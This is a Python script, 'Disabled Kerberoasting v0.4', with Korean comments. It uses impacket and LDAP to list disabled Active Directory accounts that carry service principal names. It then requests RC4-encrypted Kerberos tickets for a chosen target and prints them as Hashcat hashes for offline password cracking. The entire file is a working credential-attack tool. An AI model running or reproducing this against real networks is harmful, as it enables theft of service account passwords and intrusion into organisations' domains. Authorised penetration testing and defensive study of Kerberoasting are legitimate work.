#!/usr/bin/env python3
# Disabled Kerberoasting v0.4 - Modified for lazy-ldap import and ldapsearch fallback
import warnings
warnings.filterwarnings("ignore", message=".*pkg_resources is deprecated as an API.*" ,category=UserWarning)
import argparse, inspect, sys, subprocess, shlex
from impacket.krb5 import constants
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.ntlm import compute_nthash
from impacket import version
from pyasn1.codec.der import decoder
from impacket.krb5.asn1 import AS_REP, EncKDCRepPart
import datetime

# 사용자 인자 핸들링 함수
def setArguments():
    args = argparse.ArgumentParser()
    args.add_argument("-d","--domain", required=True, help="domain")
    args.add_argument("-u","--username", required=True, help="user name")
    args.add_argument("-p","--password", required=True, help="user password")
    args.add_argument("-dc-ip", required=True, help="domain controller address")
    args.add_argument("--request-user", help="specify target account name", required=False)
    args = args.parse_args()
    target = ''
    domain = args.domain
    user = args.username
    password = args.password
    dc_ip = args.dc_ip
    target = args.request_user
    return domain, user, password, dc_ip, target

# last_logon, pwd_set 값 출력 시 날짜 형태로 변환 (robust: bytes/str/int)
def filetime_to_dt(ft):
    # Accept int, str, bytes
    if isinstance(ft, (bytes, bytearray)):
        try:
            ft_int = int(ft.decode(errors="ignore"))
        except Exception:
            try:
                ft_int = int(ft)
            except Exception:
                ft_int = 0
    elif isinstance(ft, str):
        try:
            ft_int = int(ft)
        except Exception:
            ft_int = 0
    elif isinstance(ft, int):
        ft_int = ft
    else:
        try:
            ft_int = int(ft)
        except Exception:
            ft_int = 0
    # AD FILETIME is in 100-nanosecond intervals since Jan 1, 1601
    # original code assumed ft was in 100-ns units and did //10 -> microseconds
    try:
        micros = ft_int // 10
        epoch = datetime.datetime(1601, 1, 1)
        return epoch + datetime.timedelta(microseconds=micros)
    except Exception:
        return datetime.datetime(1601, 1, 1)

# --request-user 사용 안 할 시, 도메인 비활성화 SPN 목록만 열거하는 LDAP 요청
def getDisabledAccounts(domain, user, password, dc_ip):
    """
    반환: rows 형식의 리스트
    각 항목: [sam(bytes), spns(list of bytes), memberOf(list of bytes), pwdLastSet(bytes), lastLogon(bytes), delegation(list of bytes)]
    """
    # lazy import
    try:
        import ldap
    except ImportError:
        # python-ldap가 없으면 ldapsearch CLI 폴백 시도
        base_dn = ",".join(f"DC={part}" for part in domain.split("."))
        search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(servicePrincipalName=*))"
        attrs = "sAMAccountName servicePrincipalName memberOf pwdLastSet lastLogon msDS-AllowedToDelegateTo"
        # ldapsearch -x -H ldap://DC -D "user@domain" -w password -b "DC=domain,DC=local" "(filter)" attrs
        ldapsearch_cmd = (
            f'ldapsearch -x -H ldap://{dc_ip} -D "{user}@{domain}" -w "{password}" '
            f'-b "{base_dn}" "{search_filter}" {attrs}'
        )
        try:
            proc = subprocess.run(shlex.split(ldapsearch_cmd), capture_output=True, text=True, timeout=60)
        except FileNotFoundError:
            print("[-] ldapsearch가 시스템에 설치되어 있지 않습니다. (python-ldap 설치 권장: pip3 install python-ldap)")
            return []
        except Exception as e:
            print("[-] ldapsearch 실행 중 오류:", e)
            return []

        if proc.returncode != 0:
            print("[-] ldapsearch 실패:", proc.stderr.strip())
            return []

        out = proc.stdout.splitlines()
        results = []
        cur = {}
        # 매우 단순 파서 — 복잡한 출력의 경우 확장 필요
        for line in out:
            line = line.rstrip()
            if not line:
                if cur:
                    results.append(cur)
                    cur = {}
                continue
            if line.startswith("dn: "):
                cur["dn"] = line[4:]
            elif ": " in line:
                k, v = line.split(": ", 1)
                # ldapsearch 같은 값이 여러 줄로 이어질 수 있으므로 append
                cur.setdefault(k, []).append(v)
        if cur:
            results.append(cur)

        formatted = []
        for ent in results:
            sam = ent.get("sAMAccountName", [""])[0].encode() if ent.get("sAMAccountName") else b""
            if sam.decode(errors="ignore") == "krbtgt":
                continue
            spns = [s.encode() for s in ent.get("servicePrincipalName", [])]
            memberOf = [m.encode() for m in ent.get("memberOf", [])]
            pwdLastSet = ent.get("pwdLastSet", ["0"])[0].encode() if ent.get("pwdLastSet") else b"0"
            lastLogon = ent.get("lastLogon", ["0"])[0].encode() if ent.get("lastLogon") else b"0"
            delegation = [d.encode() for d in ent.get("msDS-AllowedToDelegateTo", [])]
            formatted.append([sam, spns, memberOf, pwdLastSet, lastLogon, delegation])
        return formatted

    # python-ldap가 존재하면 기존 방식으로 조회
    bind_dn = user + '@' + domain
    base_dn = ",".join(f"DC={part}" for part in domain.split("."))
    try:
        conn = ldap.initialize(f"ldap://{dc_ip}")
        conn.set_option(ldap.OPT_REFERRALS, 0)
        conn.simple_bind_s(bind_dn, password)
    except ldap.LDAPError as e:
        print(f"[-] LDAP bind error: {e}")
        return []
    search_filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(servicePrincipalName=*))"
    attrs = ["sAMAccountName", "servicePrincipalName", "memberOf", "pwdLastSet", "lastLogon", "msDS-AllowedToDelegateTo"]
    try:
        results = conn.search_s(base_dn, ldap.SCOPE_SUBTREE, search_filter, attrs)
    except ldap.LDAPError as e:
        print(f"[-] LDAP search error: {e}")
        conn.unbind()
        return []
    searchResults = []
    if not results:
        print("[-] There is no result.")
    else:
        for dn, entry in results:
            if not isinstance(entry, dict):
                continue
            sam = entry.get("sAMAccountName", [b""])[0]
            try:
                sam_dec = sam.decode()
            except Exception:
                sam_dec = str(sam)
            if sam_dec == "krbtgt":
                continue
            spns       = entry.get("servicePrincipalName", [])
            member_of  = entry.get("memberOf", [])
            pwd_set    = entry.get("pwdLastSet", [b"0"])[0]
            last_logon = entry.get("lastLogon", [b"0"])[0]
            delegation = entry.get("msDS-AllowedToDelegateTo", [])
            searchResults.append([sam, spns, member_of, pwd_set, last_logon, delegation])
    conn.unbind()
    return searchResults

# getDisabledAccounts 함수로 얻은 searchResults 리스트를 반복문 2개로 출력
def printResults(searchResults):
    # 출력할 컬럼
    headers = [
        "ServicePrincipalName",
        "Name",
        "MemberOf",
        "PasswordLastSet",
        "LastLogon",
        "Delegation"
    ]

    # 각 컬럼 이름 길이를 계산하여 딕셔너리로 관리
    col_width = {}
    for idx in range(len(headers)):
        curHeader = headers[idx]
        col_width[curHeader] = len(curHeader)

    # getDisabledAccounts에서 이중 리스트로 관리한 결과를 단일 리스트로 변경하여 관리
    rows = []
    for entry in searchResults:
        sam          = entry[0]
        spns         = entry[1]
        memberOf     = entry[2]
        pwd_last_set = entry[3]
        last_logon   = entry[4]
        delegation   = entry[5]

        # pwd_dt, logon_dt 날짜로 변환
        pwd_dt   = filetime_to_dt(pwd_last_set)
        logon_dt = filetime_to_dt(last_logon)
        pwd_str   = pwd_dt.strftime("%Y-%m-%d %H:%M:%S.%f")
        logon_str = logon_dt.strftime("%Y-%m-%d %H:%M:%S.%f")

        # 인코딩되어 있으면 디코딩해서 문자로 저장
        if isinstance(sam, (bytes, bytearray)):
            try:
                sam_str = sam.decode()
            except Exception:
                sam_str = str(sam)
        else:
            sam_str = str(sam)

        # 인코딩되어 있으면 디코딩해서 문자로 저장. 여러 멤버그룹에 속해있으면 쉼표로 구분
        if isinstance(memberOf, list):
            temp_list = []
            for m in memberOf:
                if isinstance(m, (bytes, bytearray)):
                    temp_list.append(m.decode(errors="ignore"))
                else:
                    temp_list.append(str(m))
            member_str = ", ".join(temp_list)
        else:
            member_str = str(memberOf)

        # 인코딩되어 있으면 디코딩해서 문자로 저장. 여러 위임 구성이 되어있으면 쉼표로 구분
        if isinstance(delegation, list):
            temp_list = []
            for d in delegation:
                if isinstance(d, (bytes, bytearray)):
                    temp_list.append(d.decode(errors="ignore"))
                else:
                    temp_list.append(str(d))
            deleg_str = ", ".join(temp_list)
        else:
            deleg_str = str(delegation)

        if isinstance(spns, list):
            spn_list = spns
        else:
            spn_list = [spns]

        for sp in spn_list:
            if isinstance(sp, (bytes, bytearray)):
                try:
                    spn_str = sp.decode()
                except Exception:
                    spn_str = str(sp)
            else:
                spn_str = str(sp)
            # 전체 변수를 문자로 변환한 뒤, 각 항목을 rows 딕셔너리에 삽입
            rows.append([spn_str, sam_str, member_str, pwd_str, logon_str, deleg_str])

    if not rows:
        print("[-] There is no result.")
        return

    for r in rows:
        for i, cell in enumerate(r):
            col_width[headers[i]] = max(col_width[headers[i]], len(cell))

    header_line = "  ".join(headers[i].ljust(col_width[headers[i]]) for i in range(len(headers)))
    separator   = "  ".join("-" * col_width[headers[i]]       for i in range(len(headers)))
    print('\n')
    print(header_line)
    print(separator)

    for r in rows:
        line = "  ".join(r[i].ljust(col_width[headers[i]]) for i in range(len(headers)))
        print(line)

def sendAsReq(domain, user, password, dc_ip, target):
    print('\n')
    realm   = domain.upper()
    cname = Principal(user,
            type=constants.PrincipalNameType.NT_PRINCIPAL.value)

    # RC4-HMAC 강제: nthash 사용 (etype 23)
    nthash = compute_nthash(password)
    kw = {"lmhash": '', "nthash": nthash, "aesKey": '', "kdcHost": dc_ip}

    # SPN 옵션 적용
    sig = inspect.signature(getKerberosTGT).parameters
    sname = Principal(target, type=constants.PrincipalNameType.NT_SRV_INST.value)
    if "serverName" in sig:
        kw["serverName"] = sname
    elif "targetName" in sig:
        kw["targetName"] = sname
    else:
        sys.exit("This impacket build does not support -target flag.")

    # 1) AS-REQ (TGT 요청 with RC4)
    asResponse = getKerberosTGT(cname, password, realm, **kw)

    rawAsResponse = asResponse[0]
    asn1_rep, _ = decoder.decode(rawAsResponse, asn1Spec=AS_REP())
    tgt, cipher, skey = asResponse[0], asResponse[-2], asResponse[-1]
    # 2) SPN 지정 시 TGS 수동 요청
    if not ("serverName" in kw or "targetName" in kw):
        tgs_tup = getKerberosTGS(sname, realm, dc_ip, tgt, cipher, skey)
        tgt, cipher, skey = tgs_tup[0], tgs_tup[1], tgs_tup[-1]

    # Hashcat 포맷 자동 출력 (etype 23)
    cipher_bytes = bytes(asn1_rep['ticket']['enc-part']['cipher'])
    salt = cipher_bytes.hex()[:32]
    encrypted_data = cipher_bytes.hex()[32:]
    hc = f"$krb5tgs$23$*{target}${realm}${domain}/{target}*${salt}${encrypted_data}"
    print(hc)

def main():
    domain, user, password, dc_ip, target = setArguments()

    if target:
        sendAsReq(domain, user, password, dc_ip, target)
        return
    else:
        searchResults = getDisabledAccounts(domain, user, password, dc_ip)
        printResults(searchResults)
        return

if __name__ == "__main__":
    version.BANNER = ""
    try:
        print(f'Disabled Kerberoasting v0.4 - Copyright 2025 All rights reserved by mick3y')
        main()
    except Exception as e:
        sys.exit(f"[-] {e}")
